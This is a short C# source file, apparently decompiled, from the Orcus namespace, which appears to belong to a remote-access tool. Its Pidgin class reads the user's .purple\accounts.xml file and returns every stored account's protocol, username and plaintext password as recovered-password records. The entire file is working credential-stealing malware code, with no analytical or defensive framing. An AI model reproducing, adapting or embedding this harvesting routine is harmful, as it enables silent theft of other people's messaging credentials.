using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.Pidgin;

internal class Pidgin : IPasswordRecovery
{
	public IEnumerable<RecoveredPassword> GetPasswords()
	{
		FileInfo fileInfo = new FileInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".purple\\accounts.xml"));
		if (!fileInfo.Exists)
		{
			yield break;
		}
		XmlTextReader reader = new XmlTextReader(fileInfo.FullName);
		XmlDocument xmlDocument = new XmlDocument();
		xmlDocument.Load(reader);
		if (xmlDocument.DocumentElement != null)
		{
			foreach (XmlNode childNode in xmlDocument.DocumentElement!.ChildNodes)
			{
				XmlNodeList childNodes = childNode.ChildNodes;
				RecoveredPassword password;
				try
				{
					RecoveredPassword val = new RecoveredPassword();
					val.set_Application("Pidgin");
					val.set_UserName(childNodes[1]!.InnerText);
					val.set_Password(childNodes[2]!.InnerText);
					val.set_Field1(childNodes[0]!.InnerText);
					val.set_PasswordType((PasswordType)1);
					password = val;
				}
				catch (Exception)
				{
					continue;
				}
				yield return password;
			}
		}
		reader.Close();
	}
}
